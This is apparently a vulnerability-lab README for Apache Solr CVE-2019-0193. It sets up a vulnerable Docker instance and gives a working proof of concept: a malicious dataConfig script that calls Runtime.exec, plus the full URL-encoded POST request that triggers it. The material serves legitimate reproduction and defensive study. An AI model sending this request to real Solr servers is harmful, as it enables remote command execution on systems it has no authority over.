# Apache Solr Remote Command Execution (CVE-2019-0193)

[中文版本(Chinese version)](README.zh-cn.md)

Apache Solr is an open-source search server. It is written in Java and built upon Apache Lucene. This vulnerability exists in Apache Solr's DataImportHandler, which is an optional but commonly used module for extracting data from databases and other sources. The vulnerability arises because all DIH configurations can be set through the dataConfig parameter in external requests. Since DIH configurations can contain scripts, attackers can execute remote commands by constructing malicious requests.

References:

- <https://mp.weixin.qq.com/s/typLOXZCev_9WH_Ux0s6oA>
- <https://paper.seebug.org/1009/>

## Environment Setup

Execute the following command to start an Apache Solr 8.1.1 server:

```
docker compose up -d
```

After the server starts, you can access the Apache Solr management interface at `http://your-ip:8983/`. No authentication is required.

## Vulnerability Reproduction

First, select the `demo` core from the left sidebar, open the Dataimport panel, enable Debug mode on the right, and enter the following POC:

```
<dataConfig>
  <script><![CDATA[
          function poc(){ java.lang.Runtime.getRuntime().exec("touch /tmp/success");
          }
  ]]></script>
  <document>
    <entity name="sample"
            fileName=".*"
            baseDir="/"
            processor="FileListEntityProcessor"
            recursive="false"
            transformer="script:poc" />
  </document>
</dataConfig>
```

![](1.png)

Click "Execute with this Configuration" to send the following request:

```
POST /solr/demo/dataimport?_=1708782956647&indent=on&wt=json HTTP/1.1
Host: your-ip:8983
Content-Length: 613
Accept: application/json, text/plain, */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Content-type: application/x-www-form-urlencoded
Origin: http://your-ip:8983
Referer: http://your-ip:8983/solr/
Accept-Encoding: gzip, deflate, br
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7
Connection: close

command=full-import&verbose=false&clean=false&commit=true&debug=true&core=demo&dataConfig=%3CdataConfig%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22touch+%2Ftmp%2Fsuccess%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22sample%22%0A++++++++++++fileName%3D%22.*%22%0A++++++++++++baseDir%3D%22%2F%22%0A++++++++++++processor%3D%22FileListEntityProcessor%22%0A++++++++++++recursive%3D%22false%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&name=dataimport
```

Execute `docker compose exec solr ls /tmp` to enter the container, and you can see that `touch /tmp/success` has been successfully executed:

![](2.jpg)
